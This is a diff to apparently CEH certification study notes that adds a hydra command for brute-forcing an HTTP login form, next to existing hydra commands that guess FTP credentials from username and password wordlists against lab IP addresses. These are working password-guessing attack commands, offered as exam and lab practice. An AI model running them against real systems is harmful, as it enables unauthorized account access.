@@ -45,6 +45,8 @@ Then go to Desktop and in Ceh tools folder you will find wordlists, here you wil
 Now in terminal type-  hydra -L /home/attacker/Desktop/CEH_TOOLS/Wordlists/Username.txt -P /home/attacker/Desktop/CEH_TOOLS/Wordlists/Password.txt ftp://10.10.10.10
 
 hydra -l user -P passlist.txt ftp://10.10.10.10
+
+hydra -l <username> -P <wordlist> 10.10.82.119 http-post-form "/:username=^USER^&password=^PASS^:F=incorrect" -V
 ```
 #  Hacking Web Application
 ```
